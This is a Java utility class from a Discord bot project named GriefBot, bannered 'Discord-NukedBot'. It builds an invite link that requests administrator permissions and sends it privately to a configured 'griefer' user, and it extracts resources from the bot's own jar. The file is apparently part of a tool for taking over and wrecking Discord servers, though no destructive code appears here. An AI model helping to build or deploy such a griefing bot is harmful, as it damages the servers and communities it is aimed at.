package de.corruptedbytes.utils;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URISyntaxException;
import java.util.Base64;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import de.corruptedbytes.GriefBot;
import net.dv8tion.jda.api.entities.User;

public class Utils {
	
	public static void sendInfo() {
		int guilds = GriefBot.instance.manager.getGuilds().size();
		
		System.out.println(getBanner());
		if (guilds != 0) {
			System.out.println("The Bot is currently on " + guilds + " servers");
		}
		else
		{
			String link = "https://discord.com/api/oauth2/authorize?client_id=" + new String(Base64.getDecoder().decode(GriefBot.instance.botToken.split("\\.")[0])) + "&permissions=8&scope=bot\n";
			try {
				User user = GriefBot.instance.manager.getUserById(GriefBot.instance.grieferUserID);
				user.openPrivateChannel().queue((channel) ->
		        {
		            channel.sendMessage("**Bot Invite Link:**\n" + link).queue();
		        });
			} catch (Exception e) {
				System.out.println(" Invite Link: " + link);
			}
		}
	}
	
	public static void extractResource(String output, String file) throws IOException, URISyntaxException {
		File f = new File(GriefBot.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        OutputStream out = new FileOutputStream(output);
        FileInputStream fileInputStream = new FileInputStream(f.getAbsoluteFile());
        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
        ZipInputStream zin = new ZipInputStream(bufferedInputStream);
        ZipEntry ze = null;

        while((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals(file)) {
                byte[] buffer = new byte[9000];

                int len;
                while((len = zin.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }
                out.close();
                break;
            }
        }
        zin.close();
    }
	
	private static String getBanner() {
		return "\n =-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=\n	Discord-NukedBot by mamaono \n =-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=\n";
	}
}